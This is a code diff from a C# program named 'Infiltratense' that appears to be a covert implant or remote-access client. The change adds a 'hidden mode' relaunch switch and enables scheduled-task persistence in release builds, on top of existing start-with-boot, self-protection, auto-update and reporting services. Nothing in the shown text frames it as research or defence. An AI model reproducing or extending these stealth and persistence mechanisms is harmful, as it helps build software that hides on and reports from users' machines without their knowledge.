@@ -27,23 +27,31 @@ namespace Infiltratense
                     case "h":
                         Console.WriteLine("\n\n-v -version\t\tView current version number.");
                         Console.WriteLine("-h -help\t\tView help.");
+                        Console.WriteLine("-s -switch\t\tSwitch to hidden mode.");
                         break;
+                    case "s":
+                        ProcessService.StartProcess(CellFileInfo.ProgramFile, false);
+                        break;
+
                 }
                 return;
             }
+
 #if DEBUG
             var host = new HostService()
                 .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: true, ForceCurrent: true)
                 .UseProtectorService(Disable: true, Debug: true)
                 .UseStartWithBootService(Set: false)
-                .UseReportService(TimeOut: 1000)
+                .UseTaskSchedulerService(Disabled: true)
+                .UseReportService(TimeOut: 1000, Delay: true)
                 .UseStartUp<StartUp>();
 #else
             var host = new HostService()
                 .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: false, ForceCurrent: false)
                 .UseProtectorService(Disable: false, Debug: false)
                 .UseStartWithBootService(Set: true)
-                .UseReportService(TimeOut: 1000)
+                .UseTaskSchedulerService(Disabled: false)
+                .UseReportService(TimeOut: 1000,Delay:false)
                 .UseStartUp<StartUp>();
 #endif
             host.Run();
